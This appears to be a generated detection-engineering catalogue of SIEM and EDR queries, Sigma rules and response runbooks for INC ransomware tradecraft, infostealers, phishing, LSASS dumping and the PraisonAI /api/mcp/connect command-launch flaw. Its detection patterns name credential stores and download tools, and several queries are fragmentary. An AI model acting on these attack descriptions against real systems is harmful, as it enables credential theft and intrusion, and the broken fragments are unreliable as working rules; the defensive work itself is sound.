Non-Veeam process accessing Veeam Backup config / CryptoKeys (credential dumper) AIActions on Objectives High
Detects a non-Veeam process opening files under the Veeam Backup configuration tree (Config.xml, CryptoKeys, VeeamBackup.config) — the path INC's updated credential dumper takes against newer Veeam deployments that use salted DPAPI encryption. Excludes the legitimate Veeam service binaries and SQL Server. Rationale: Article specifically notes INC's updated credential dumper targets Veeam backup servers using salted DPAPI encryption. The Veeam config/CryptoKeys tree is only legitimately accessed by Veeam's own service binaries and the local SQL Server hosting VeeamBackup — any other process is anomalous.
ATT&CKT1003 T1555
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Veeam upgrade installer (VeeamBackup&Replication_*.exe) running setup with elevated privileges
  • Backup admin browsing the install directory in Explorer (filter on explorer.exe)
  • AV/EDR full-disk scan reading the config files (filter on MsMpEng.exe and Sense.exe)
  • Veeam One reporting service reaching into the Backup tree (whitelist Veeam.ONE.*)
  • Custom in-house monitoring script (verify by service account and scheduled-task parent)
Suppression filter
| where not(InitiatingProcessFileName startswith "VeeamBackup") and not(InitiatingProcessFolderPath has @"\Veeam\Backup and Replication\")
Response runbook
1) TRIAGE: Identify the initiating process binary + SHA256, capture command line, check whether process is signed and whether it has prior reputation on the host. 2) CONTAIN: Isolate the Veeam backup server, rotate all service accounts whose credentials live in the Veeam configuration (esp. domain backup/restore accounts, storage repository creds), invalidate DPAPI master-keys for the Veeam service user. 3) HUNT: Look for ProcessAccess events targeting Veeam.Backup.Service.exe (LSASS-like dump) in the same window, search for outbound rclone or 7z.exe staging from the Veeam server, and check for fresh domain admin Kerberos tickets within 2h of the dump.
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated", "FileModified", "FileOpenedForRead")
| where FolderPath has @"\Veeam\Backup" or FileName in~ ("VeeamBackup.config", "Config.xml") or FolderPath has "CryptoKeys"
| where not(InitiatingProcessFileName startswith "Veeam.")
| where not(InitiatingProcessFileName in~ ("sqlservr.exe", "MsMpEng.exe", "MsSense.exe", "explorer.exe", "backup.exe"))
| where not(InitiatingProcessAccountName endswith "$")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FileName, FolderPath, ActionType
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID in (4663, 4656)
| where ObjectName has @"\Veeam\Backup" or ObjectName has "CryptoKeys" or ObjectName has "VeeamBackup.config"
| where not(ProcessName contains "Veeam")
| where not(ProcessName contains "sqlservr")
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, ProcessName, ObjectName, AccessMask, HandleId
| order by TimeGenerated desc
source:windows.sysmon @EventID:11 (@TargetFilename:*\\Veeam\\Backup* OR @TargetFilename:*CryptoKeys* OR @TargetFilename:*VeeamBackup.config*) -@Image:*\\Veeam.* -@Image:*\\sqlservr.exe -@Image:*\\MsMpEng.exe
#event_simpleName=FileOpenInfo (TargetFileName=/\\Veeam\\Backup/i OR TargetFileName=/CryptoKeys/i OR TargetFileName=/VeeamBackup\.config/i)
| NOT (ContextImageFileName=/\\Veeam\./i OR ContextImageFileName=/\\sqlservr\.exe$/i OR ContextImageFileName=/\\MsMpEng\.exe$/i)
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())

Multiple commercial RMM tools deployed on the same host within 24h (INC C2 fan-out) AICommand & Control Medium
Detects two or more distinct INC-favoured commercial RMM agents (AnyDesk, ScreenConnect/ConnectWise Control, TeamViewer) executing on the same host inside a 24-hour window. INC affiliates routinely drop multiple RMM tools as redundant C2 fallback channels — a pattern unusual for legitimate IT, which standardises on one. Rationale: Article lists AnyDesk, ScreenConnect and TeamViewer as INC affiliates' simultaneously-dropped RMM tools. Counting >=2 distinct RMM families on one host within 24h captures the affiliate's redundancy pattern; corporate IT standardises on a single RMM so the threshold is meaningful.
ATT&CKT1219 T1572
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • MSP transition / takeover where the new provider's RMM runs alongside the old one being decommissioned
  • Helpdesk troubleshooting where a temporary TeamViewer Quick Support session is started on an AnyDesk-managed host
  • Workstation reimage where vendor pre-install includes a manufacturer remote-assist tool plus corporate RMM
  • Software developer testing RMM integrations on a workstation
Suppression filter
| where not(DeviceName in~ (dynamic(["IT-HELPDESK-01", "MSP-RELAY-01"]))) and not(Binaries has "teamviewer_quicksupport.exe" and DistinctFamilies == 2)
Response runbook
1) TRIAGE: Confirm whether the host is managed by an approved RMM (check CMDB / asset inventory); pull the install paths and signatures of each RMM binary; review network connections from each RMM process to identify external operator IPs. 2) CONTAIN: Isolate the host, block unauthorised RMM connect URLs at perimeter (anydesk.com/relay-*, *.screenconnect.com instances not owned by your MSP, *.teamviewer.com if unused), kill rogue RMM services and uninstall via MSI. 3) HUNT: Pivot on the RMM operator's source IPs across the estate, search for Cobalt Strike beacon traffic (article names it as INC's C2), and check for fresh local admin accounts, scheduled tasks, or services created within 2h of first RMM execution.
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName in~ ("anydesk.exe", "screenconnect.clientservice.exe", "screenconnect.windowsclient.exe", "connectwisecontrol.client.exe", "teamviewer.exe", "teamviewer_service.exe", "tv_w32.exe", "tv_x64.exe")
| extend RmmFamily = case(
    FileName =~ "anydesk.exe", "AnyDesk",
    FileName has "screenconnect" or FileName has "connectwisecontrol", "ScreenConnect",
    FileName has "teamviewer" or FileName has "tv_", "TeamViewer",
    "Other")
| summarize DistinctFamilies = dcount(RmmFamily), Families = make_set(RmmFamily), Binaries = make_set(FileName), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by DeviceName
| where DistinctFamilies >= 2
| order by LastSeen desc
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4688
| where NewProcessName has_any ("anydesk.exe", "ScreenConnect.ClientService.exe", "ScreenConnect.WindowsClient.exe", "ConnectWiseControl.Client.exe", "teamviewer.exe", "TeamViewer_Service.exe", "tv_w32.exe", "tv_x64.exe")
| extend BinName = tolower(tostring(split(NewProcessName, "\\")[-1]))
| extend RmmFamily = case(
    BinName == "anydesk.exe", "AnyDesk",
    BinName has "screenconnect" or BinName has "connectwisecontrol", "ScreenConnect",
    BinName has "teamviewer" or BinName has "tv_", "TeamViewer",
    "Other")
| summarize DistinctFamilies = dcount(RmmFamily), Families = make_set(RmmFamily), Binaries = make_set(BinName), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by Computer
| where DistinctFamilies >= 2
| order by LastSeen desc
source:windows.security @EventID:4688 @NewProcessName:(*\\anydesk.exe OR *\\AnyDesk.exe OR *\\ScreenConnect.ClientService.exe OR *\\ScreenConnect.WindowsClient.exe OR *\\ConnectWiseControl.Client.exe OR *\\teamviewer.exe OR *\\TeamViewer.exe OR *\\TeamViewer_Service.exe OR *\\tv_w32.exe OR *\\tv_x64.exe)
#event_simpleName=ProcessRollup2 ImageFileName=/\\(anydesk|screenconnect\.clientservice|screenconnect\.windowsclient|connectwisecontrol\.client|teamviewer|teamviewer_service|tv_w32|tv_x64)\.exe$/i
| case {
    ImageFileName=/anydesk\.exe$/i | RmmFamily := "AnyDesk";
    ImageFileName=/(screenconnect|connectwisecontrol)/i | RmmFamily := "ScreenConnect";
    ImageFileName=/(teamviewer|tv_)/i | RmmFamily := "TeamViewer";
    * | RmmFamily := "Other";
  }
| groupBy([aid, ComputerName], function=[count(field=RmmFamily, distinct=true, as=DistinctFamilies), collect(RmmFamily)])
| DistinctFamilies >= 2

ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents

| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)

| order by conn_count desc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high

        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"

      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

         where All_Email.action="delivered" AND All_Email.url!="-"

     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc
ENDPOINT

| tstats `summariesonly` count
    from datamodel=Email.All_Email

    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject

    [| tstats `summariesonly` count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user

    [| tstats summariesonly=false count

title: Office Application Spawning Script Host

status: experimental

    object payload signature.

    - https://attack.mitre.org/techniques/T1566/001/

logsource:
    category: process_creation

            - '\excel.exe'

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: Remote-Management (RMM) Tool Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0c
status: experimental
description: |
    AnyDesk / TeamViewer / ScreenConnect / Atera / Splashtop /
    RustDesk — RMM tools attackers commonly install for hands-on-
    keyboard access. Filter against the IT estate's known tool.
references:
    - https://attack.mitre.org/techniques/T1219/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1219
    - attack.command-and-control
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\AnyDesk.exe'
            - '\TeamViewer.exe'
            - '\TeamViewer_Service.exe'
            - '\ScreenConnect.ClientService.exe'
            - '\ConnectWiseControl.ClientService.exe'
            - '\atera_agent.exe'
            - '\SplashtopStreamer.exe'
            - '\RustDesk.exe'
            - '\NinjaOne.exe'
    condition: selection
falsepositives:
    - IT-approved RMM in use across the estate. Maintain a known-IT-
      tool exclusion list per environment.
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children

status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02

logsource:

detection:

            - '\pwsh.exe'

            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'

Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Unauthenticated POST /api/mcp/connect — exploit attempt at web tier · Article-specific behavioural hunt — [GHSA / CRITICAL] GHSA-p75f-6fp4-p57w: PraisonAI: Missing Authentication for Cri

Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
PraisonAI UI / aiui server listening on 0.0.0.0 (vulnerable exposure) AIWeaponization High
Hunts for launches of the PraisonAI UI / claw dashboard or any host app built on praisonaiui that binds 0.0.0.0 by default and exposes the unauthenticated /api/mcp/connect endpoint. Surfaces the vulnerable server's startup so an analyst can audit network exposure before exploitation. Rationale: Anchors on the exact CLI invocations and Python entry points the advisory names (praisonai ui, praisonai claw, aiui run, praisonaiui.server.create_app, create_host_app, build_host_app). Each of these binds 0.0.0.0 by default per ui.py:114/163/186/204/222 and claw.py:41/93. Cross-checked against GHSA-p75f-6fp4-p57w; non-malicious itself, but every hit is a vulnerable v4.6.48 instance. Cross-checked against: • https://github.com/advisories/GHSA-p75f-6fp4-p57w
ATT&CKT1190 T1133
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate AI dev team running praisonai ui on a workstation for agent prototyping
  • CI/CD pipeline running praisonai ui in an ephemeral container for integration tests
  • Internal data-science lab where praisonai is a sanctioned tool
  • Researchers running the upstream PoC on an isolated VM
Suppression filter
| where not (DeviceName has_any ("dev-", "lab-", "sandbox-", "ci-"))
Response runbook
Step 1 — Triage: confirm praisonai version (run `pip show praisonai` on host) and check whether AUTH_ENFORCE=true is set; if either is true, downgrade severity. Verify the listening socket exposure with `ss -tlnp | grep python` and whether port is reachable from any non-loopback network. Step 2 — Contain: if exposed on a routable interface, immediately firewall the listening port to localhost only, kill the process, and require operator restart with --host 127.0.0.1 plus AUTH_ENFORCE=true. Notify host owner. Step 3 — Hunt: pivot to UC "Child process spawned by PraisonAI UI / aiui" for the same host over the past 30 days to detect prior exploitation; query proxy/WAF logs for inbound POSTs to /api/mcp/connect from any source.
DeviceProcessEvents | where Timestamp > ago(7d) | where ProcessCommandLine has_any ("praisonai ui", "praisonai claw", "aiui run", "praisonaiui.server.create_app", "create_host_app", "build_host_app") | where AccountName !endswith "$" | project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc
SecurityEvent | where TimeGenerated > ago(7d) | where EventID == 4688 | where CommandLine has_any ("praisonai ui", "praisonai claw", "aiui run", "praisonaiui.server.create_app", "create_host_app", "build_host_app") | where AccountName !endswith "$" | project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName | order by TimeGenerated desc

Unauthenticated POST /api/mcp/connect — exploit attempt at web tier AIExploitation High
Hunts for inbound HTTP POSTs to the PraisonAI UI endpoint that converts attacker-controlled JSON (command/args) into a local process launch. Any non-localhost source posting to this exact URI is exploit traffic, since the only documented use is the vulnerable code path itself. Rationale: The advisory names the endpoint praisonaiui/server.py:1488 / line 2770 — POST /api/mcp/connect with a JSON body containing command and args. This URI exists in no other product, so any inbound POST is either the documented PoC or an exploit attempt; no legitimate caller exists besides the vulnerable UI itself. Cross-checked against: • https://github.com/advisories/GHSA-p75f-6fp4-p57w
ATT&CKT1190 T1059
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal vulnerability scanner (Nessus / Qualys / Tenable / WAS) probing the endpoint as part of an authorised assessment
  • Red-team / pentester running the published PoC during an engagement
  • Sanctioned PraisonAI UI client connecting an MCP server (legitimate operator use, if any)
  • Sourcegraph / GitHub crawler hitting the path from documentation links
Suppression filter
| where not (SourceIP in ("<allow-list of scanner IPs>"))
Response runbook
Step 1 — Triage: pull the full POST body from the WAF / reverse proxy. The body field `command` will literally contain the OS binary the attacker asked the server to launch (e.g. /bin/sh, curl, /usr/bin/touch). Cross-reference source IP against threat intel and authorised scanner allow-list. Step 2 — Contain: block the source IP at perimeter, take the PraisonAI host off the network, snapshot disk + memory before reboot. Step 3 — Hunt: on the target host, run the companion UC "Child process spawned by PraisonAI UI / aiui" for the matching timestamp ±2 minutes; check shell histories, /tmp drops, and any new persistence (cron / systemd / Run keys) created by the praisonai service user.
union isfuzzy=true (CommonSecurityLog | where TimeGenerated > ago(7d) | where RequestMethod =~ "POST" | where RequestURL has "/api/mcp/connect" | project TimeGenerated, SourceIP, DestinationIP, DestinationPort, RequestURL, RequestMethod, DeviceVendor, DeviceProduct), (W3CIISLog | where TimeGenerated > ago(7d) | where csMethod =~ "POST" | where csUriStem has "/api/mcp/connect" | project TimeGenerated, Computer, sSiteName, cIP, csMethod, csUriStem, scStatus) | order by TimeGenerated desc

WEB
Toggle if your env has no CIM data-model acceleration.

Child process spawned by PraisonAI UI / aiui (post-exploitation RCE) AIInstallation High
Detects any process whose parent command line is a praisonai/aiui host app — meaning the StdioMCPClient successfully invoked an attacker-chosen binary. Any non-Python helper born under this parent is post-exploitation evidence of GHSA-p75f-6fp4-p57w. Rationale: The advisory PoC shows /usr/bin/touch being launched as a child of the praisonai/aiui host process via StdioMCPClient (praisonaiui/features/mcp.py:332). Anchoring on the parent command line listing praisonai/aiui plus a non-Python child is the highest-fidelity post-exploitation signal — the attack literally cannot succeed without producing this parent→child pair. Cross-checked against: • https://github.com/advisories/GHSA-p75f-6fp4-p57w
ATT&CKT1059 T1190 T1106
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimately configured MCP stdio server tools launched by an authorised operator
  • Subprocess calls from PraisonAI's own agent runtime invoking allowed tool binaries
  • pip/uv install operations running build hooks under the praisonai venv
  • Developer running praisonai ui locally and spawning helper utilities through the chat UI
Suppression filter
| where not (ProcessCommandLine has_any ("pip", "uv pip", "setup.py", "build_meta") and InitiatingProcessCommandLine has "install")
Response runbook
Step 1 — Triage: identify the child binary, its arguments, and SHA256. If the binary is /bin/sh, curl, wget, base64, nc, certutil, or any LOLBin — treat as confirmed exploitation. Capture network destinations the child contacted. Step 2 — Contain: kill the parent praisonai/aiui process tree, isolate the host from network, snapshot memory + disk, rotate any credentials the praisonai service user could read (.env files, ~/.aws, ~/.ssh, cloud metadata IAM role). Step 3 — Hunt: search the host for new persistence (crontab, systemd timers/units, ~/.bashrc, Windows Run keys), outbound C2 over the past 24h from the same `aid`/DeviceId, and any /tmp/* or %TEMP%\* file writes by the praisonai user. Pivot to other hosts running praisonai 4.6.48 with the listener UC.
